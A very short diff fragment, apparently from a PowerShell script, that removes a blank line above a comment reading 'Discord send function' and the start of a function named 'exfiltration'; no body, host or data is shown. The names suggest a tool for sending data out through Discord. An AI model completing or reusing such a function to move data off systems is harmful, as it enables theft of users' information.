@@ -1,4 +1,3 @@
-
 # Discord send function
 function exfiltration () {
 	param(
